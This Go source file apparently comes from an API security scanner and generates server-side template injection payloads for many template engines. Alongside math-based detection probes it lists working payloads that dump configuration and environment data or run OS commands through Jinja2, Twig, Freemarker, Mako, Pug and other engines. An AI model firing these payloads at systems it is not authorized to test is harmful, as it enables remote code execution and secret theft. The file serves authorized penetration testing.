package payloads

import (
	"strings"

	"github.com/su1ph3r/indago/pkg/types"
)

// SSTIGenerator generates Server-Side Template Injection attack payloads
type SSTIGenerator struct{}

// NewSSTIGenerator creates a new SSTI payload generator
func NewSSTIGenerator() *SSTIGenerator {
	return &SSTIGenerator{}
}

// Type returns the attack type
func (g *SSTIGenerator) Type() string {
	return types.AttackSSTI
}

// Generate generates SSTI payloads for a parameter
func (g *SSTIGenerator) Generate(endpoint types.Endpoint, param *types.Parameter) []Payload {
	var payloads []Payload

	// Target string parameters
	if param.Type != "string" && param.Type != "" {
		return payloads
	}

	// Check if parameter is likely to be rendered in templates
	if !g.isTemplateRelevant(param, endpoint) {
		return payloads
	}

	// Detection payloads (mathematical operations for safe detection)
	payloads = append(payloads, g.detectionPayloads()...)

	// Jinja2/Python payloads
	payloads = append(payloads, g.jinja2Payloads()...)

	// Twig/PHP payloads
	payloads = append(payloads, g.twigPayloads()...)

	// Freemarker/Java payloads
	payloads = append(payloads, g.freemarkerPayloads()...)

	// Other template engines
	payloads = append(payloads, g.otherEnginePayloads()...)

	return payloads
}

// isTemplateRelevant checks if parameter might be rendered in templates
func (g *SSTIGenerator) isTemplateRelevant(param *types.Parameter, endpoint types.Endpoint) bool {
	nameLower := strings.ToLower(param.Name)
	pathLower := strings.ToLower(endpoint.Path)

	// Template-related parameter names
	templatePatterns := []string{
		"name", "title", "message", "content", "text", "body",
		"template", "tpl", "view", "render", "page",
		"email", "subject", "description", "comment",
		"preview", "format", "output", "html",
		"greeting", "notification", "alert",
	}

	for _, pattern := range templatePatterns {
		if strings.Contains(nameLower, pattern) {
			return true
		}
	}

	// Template-related endpoints
	templateEndpoints := []string{
		"/template", "/render", "/preview", "/email",
		"/notification", "/pdf", "/report", "/export",
		"/greeting", "/message", "/profile",
	}

	for _, ep := range templateEndpoints {
		if strings.Contains(pathLower, ep) {
			return true
		}
	}

	return false
}

// detectionPayloads generates safe SSTI detection payloads
// These use mathematical operations to safely detect SSTI without side effects
func (g *SSTIGenerator) detectionPayloads() []Payload {
	return []Payload{
		{
			Value:       "{{7*7}}",
			Type:        types.AttackSSTI,
			Category:    "injection",
			Description: "SSTI detection: {{7*7}} = 49",
		},
		{
			Value:       "${7*7}",
			Type:        types.AttackSSTI,
			Category:    "injection",
			Description: "SSTI detection: ${7*7} = 49",
		},
		{
			Value:       "<%= 7*7 %>",
			Type:        types.AttackSSTI,
			Category:    "injection",
			Description: "SSTI detection: ERB <%= 7*7 %> = 49",
		},
		{
			Value:       "#{7*7}",
			Type:        types.AttackSSTI,
			Category:    "injection",
			Description: "SSTI detection: Ruby #{7*7} = 49",
		},
		{
			Value:       "${{7*7}}",
			Type:        types.AttackSSTI,
			Category:    "injection",
			Description: "SSTI detection: ${{7*7}} = 49",
		},
		{
			Value:       "@(7*7)",
			Type:        types.AttackSSTI,
			Category:    "injection",
			Description: "SSTI detection: Razor @(7*7) = 49",
		},
		{
			Value:       "{{7*'7'}}",
			Type:        types.AttackSSTI,
			Category:    "injection",
			Description: "SSTI Jinja2 string multiplication = 7777777",
		},
		{
			Value:       "{{'7'*7}}",
			Type:        types.AttackSSTI,
			Category:    "injection",
			Description: "SSTI Jinja2 variant = 7777777",
		},
	}
}

// jinja2Payloads generates Jinja2/Python SSTI payloads for authorized pentesting
func (g *SSTIGenerator) jinja2Payloads() []Payload {
	return []Payload{
		{
			Value:       "{{config}}",
			Type:        types.AttackSSTI,
			Category:    "injection",
			Description: "Jinja2: Dump config object",
		},
		{
			Value:       "{{self.__dict__}}",
			Type:        types.AttackSSTI,
			Category:    "injection",
			Description: "Jinja2: Dump self dict",
		},
		{
			Value:       "{{request.environ}}",
			Type:        types.AttackSSTI,
			Category:    "injection",
			Description: "Jinja2: Dump request environment",
		},
		{
			Value:       "{{''.__class__.__mro__[2].__subclasses__()}}",
			Type:        types.AttackSSTI,
			Category:    "injection",
			Description: "Jinja2: List subclasses",
		},
		{
			Value:       "{{''.__class__.__base__.__subclasses__()}}",
			Type:        types.AttackSSTI,
			Category:    "injection",
			Description: "Jinja2: Alternative subclass listing",
		},
		{
			Value:       "{{config.items()}}",
			Type:        types.AttackSSTI,
			Category:    "injection",
			Description: "Jinja2: Enumerate config items",
		},
		{
			Value:       "{{get_flashed_messages.__globals__}}",
			Type:        types.AttackSSTI,
			Category:    "injection",
			Description: "Jinja2 Flask: Access globals",
		},
		{
			Value:       "{{lipsum.__globals__['os'].popen('whoami').read()}}",
			Type:        types.AttackSSTI,
			Category:    "injection",
			Description: "Jinja2: Command execution via lipsum",
		},
	}
}

// twigPayloads generates Twig/PHP SSTI payloads for authorized pentesting
func (g *SSTIGenerator) twigPayloads() []Payload {
	return []Payload{
		{
			Value:       "{{_self.env.registerUndefinedFilterCallback('passthru')}}{{_self.env.getFilter('whoami')}}",
			Type:        types.AttackSSTI,
			Category:    "injection",
			Description: "Twig: RCE via registerUndefinedFilterCallback",
		},
		{
			Value:       "{{['whoami']|filter('passthru')}}",
			Type:        types.AttackSSTI,
			Category:    "injection",
			Description: "Twig 2.x: Command via filter",
		},
		{
			Value:       "{{['whoami']|map('passthru')}}",
			Type:        types.AttackSSTI,
			Category:    "injection",
			Description: "Twig 3.x: Command via map",
		},
		{
			Value:       "{{app.request.server.all|join(',')}}",
			Type:        types.AttackSSTI,
			Category:    "injection",
			Description: "Twig Symfony: Dump server variables",
		},
		{
			Value:       "{{_self}}",
			Type:        types.AttackSSTI,
			Category:    "injection",
			Description: "Twig: Dump self template",
		},
		{
			Value:       "{{'whoami'|filter('passthru')}}",
			Type:        types.AttackSSTI,
			Category:    "injection",
			Description: "Twig: Alternative passthru call",
		},
	}
}

// freemarkerPayloads generates Freemarker/Java SSTI payloads for authorized pentesting
func (g *SSTIGenerator) freemarkerPayloads() []Payload {
	return []Payload{
		{
			Value:       "${7*7}",
			Type:        types.AttackSSTI,
			Category:    "injection",
			Description: "Freemarker: Basic expression",
		},
		{
			Value:       "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"whoami\")}",
			Type:        types.AttackSSTI,
			Category:    "injection",
			Description: "Freemarker: Command execution",
		},
		{
			Value:       "${\"freemarker.template.utility.Execute\"?new()(\"whoami\")}",
			Type:        types.AttackSSTI,
			Category:    "injection",
			Description: "Freemarker: Inline command execution",
		},
		{
			Value:       "[#assign ex=\"freemarker.template.utility.Execute\"?new()][=ex(\"whoami\")]",
			Type:        types.AttackSSTI,
			Category:    "injection",
			Description: "Freemarker: Alternative syntax",
		},
		{
			Value:       "${object.class.protectionDomain.codeSource.location}",
			Type:        types.AttackSSTI,
			Category:    "injection",
			Description: "Freemarker: Information disclosure",
		},
	}
}

// otherEnginePayloads generates payloads for other template engines (authorized pentesting)
func (g *SSTIGenerator) otherEnginePayloads() []Payload {
	return []Payload{
		// Velocity (Java)
		{
			Value:       "#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))#set($chr=$x.class.forName('java.lang.Character'))$rt.getRuntime()",
			Type:        types.AttackSSTI,
			Category:    "injection",
			Description: "Velocity: Runtime access",
		},
		// Smarty (PHP)
		{
			Value:       "{php}echo `whoami`;{/php}",
			Type:        types.AttackSSTI,
			Category:    "injection",
			Description: "Smarty: PHP tag execution",
		},
		{
			Value:       "{if phpinfo()}{/if}",
			Type:        types.AttackSSTI,
			Category:    "injection",
			Description: "Smarty: phpinfo disclosure",
		},
		// Mako (Python)
		{
			Value:       "${self.module.cache.util.os.popen('whoami').read()}",
			Type:        types.AttackSSTI,
			Category:    "injection",
			Description: "Mako: OS command execution",
		},
		// Pebble (Java)
		{
			Value:       "{% set cmd = 'whoami' %}{{ cmd.getClass().forName('java.lang.Runtime').getRuntime() }}",
			Type:        types.AttackSSTI,
			Category:    "injection",
			Description: "Pebble: Runtime access",
		},
		// Jade/Pug (Node.js)
		{
			Value:       "#{root.process.mainModule.require('child_process').spawnSync('whoami')}",
			Type:        types.AttackSSTI,
			Category:    "injection",
			Description: "Jade/Pug: Command execution",
		},
		// Handlebars (Node.js)
		{
			Value:       "{{#with \"s\" as |string|}}{{#with \"e\"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub \"constructor\")}}{{/with}}{{/with}}{{/with}}",
			Type:        types.AttackSSTI,
			Category:    "injection",
			Description: "Handlebars: Prototype pollution RCE",
		},
		// Thymeleaf (Java)
		{
			Value:       "__${T(java.lang.Runtime).getRuntime()}__::x",
			Type:        types.AttackSSTI,
			Category:    "injection",
			Description: "Thymeleaf: SpEL injection",
		},
	}
}
